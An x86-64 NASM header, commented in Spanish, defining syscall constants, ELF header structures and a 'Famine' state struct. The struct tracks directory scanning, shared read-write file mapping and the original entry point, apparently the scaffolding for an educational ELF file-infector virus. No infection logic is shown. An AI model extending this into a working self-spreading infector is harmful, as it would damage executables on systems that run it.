%define SC_READ         0
%define SC_OPEN         2
%define SC_CLOSE        3
%define SC_FSTAT        5
%define SC_MMAP         9
%define SC_EXIT         60
%define SC_FCHMOD       91
%define SC_GETDENTS64   217
%define SC_OPENAT       257

; open
%define O_RDONLY        0x00000000
%define	O_RDWR          0x00000002
%define O_DIRECTORY     0x00010000

; mmap
%define PROT_READ       0x1
%define PROT_WRITE      0x2
%define MAP_SHARED      0x02

; Para dirent (Regular file)
%define DT_REG        8

; el st-mode de la fstat struct (144 bytes) indica el tipo de fichero y los permisos.
; Está a +24 bytes del inicio de la struct
; los bytes alto son los del tipo de fichero
; los bytes bajos son los permisos
;
; Para calcular el tipo de fichero se hace AND sobre 0o170000(S_IFMT) sobre st-mode
; y en nuestro caso, se compara con 0o100000(S_IFREG) para regular file
; https://manpages.ubuntu.com/manpages/xenial/es/man2/stat.2.html
%define S_IFMT      0o170000
%define S_IFREG     0o100000

%define MAGIC_NUMBERS   0x464c457f ; little endian


struc	dirent
    .d_inode	resq    1	; inode number
    .d_offset	resq	1	; offset to next structure
    .d_len  	resw	1	; Size of this dirent
    .d_type     resb    1   ; File type
    .d_name		resb	1	; Filename
endstruc ; OJO el typo de fichero está al final, en el último byte del registro. 8 para ficheros regulares

struc	Elf64_Ehdr
    .e_ident		resb	16	; Magic number and other info
    .e_type			resw	1	; Object file type
    .e_machine		resw	1	; Architecture
    .e_version		resd	1	; Object file version
    .e_entry		resq	1	; Entry point virtual address
    .e_phoff		resq	1	; Program header table file offset
    .e_shoff		resq	1	; Section header table file offset
    .e_flags		resd	1	; Processor-specific flags
    .e_ehsize		resw	1	; ELF header size in bytes
    .e_phentsize	resw	1	; Program header table entry size
    .e_phnum		resw	1	; Program header table entry count
    .e_shentsize	resw	1	; Section header table entry size
    .e_shnum		resw	1	; Section header table entry count
    .e_shstrndx		resw	1	; Section header string table index
endstruc

struc	Elf64_Phdr
    .p_type			resd	1	; Segment type
    .p_flags		resd	1	; Segment flags
    .p_offset		resq	1	; Segment file offset
    .p_vaddr		resq	1	; Segment virtual address
    .p_paddr		resq	1	; Segment physical address
    .p_filesz		resq	1	; Segment size in file
    .p_memsz		resq	1	; Segment size in memory
    .p_align		resq	1	; Segment alignment
endstruc

struc Famine
    .fd_dir             resq    1
    .fd_file            resq    1
    .dirent_struc       resb    1024
    .dir_name_pointer   resq    1
    .file_original_len  resd    1
    .mmap_pointer       resq    1
    .original_entry     resq    1
endstruc
                        

%macro TRACE_TEXT 2
    push rax
    push rdi
    push rsi
    push rdx

    mov rax, 1
    mov rdi, 1
    mov rsi, %1
    mov rdx, %2
    syscall

    pop rdx
    pop rsi
    pop rdi
    pop rax
%endmacro

%define VAR(n) [(rbp - Famine_size) + n]
; Esto es para poder acceder a los valores de la stack donde se va almacenar la struc faime
; |             |
; |             |
; --------------- <- rsp
; ---------------
; |             |
; | Famine      |
; | Struct      |
; | Data        |
; |             |
; | .fd_dir     | <--- VAR(Data) ej: mov rax, VAR(Famine.fd_dir)
; |             |
; |             |
; |             |
; |             |
; --------------- <- ebp
